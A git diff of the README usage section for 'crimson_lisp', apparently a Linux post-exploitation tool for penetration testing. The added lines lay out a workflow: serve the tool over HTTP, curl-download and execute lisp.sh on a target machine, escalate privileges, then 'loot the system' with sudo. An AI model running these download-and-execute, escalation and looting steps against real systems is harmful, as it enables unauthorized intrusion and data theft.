@@ -13,13 +13,19 @@ git clone https://github.com/Karmaz95/crimson_lisp.git
 ```
 # Usage
 ```bash
+### ON THE HOST MACHINE
 cd crimson_lisp
 sudo python3 -m http.server 80
 
-# ON THE TARGET MACHINE - download and execute
+### ON THE TARGET MACHINE 
+## 1. DOWNLOAD THE TOOLS
 curl -s -k http://127.0.0.1/lisp.sh -o lisp.sh; chmod +x lisp.sh
 ./lisp.sh -u "http://127.0.0.1/"
+
+## 2. ESCALATE THE PRIVILEGES
 ./lisp.sh -e
+
+## 3. LOOT THE SYSTEM
 sudo ./lisp.sh -l
 ```
 # HISTORY
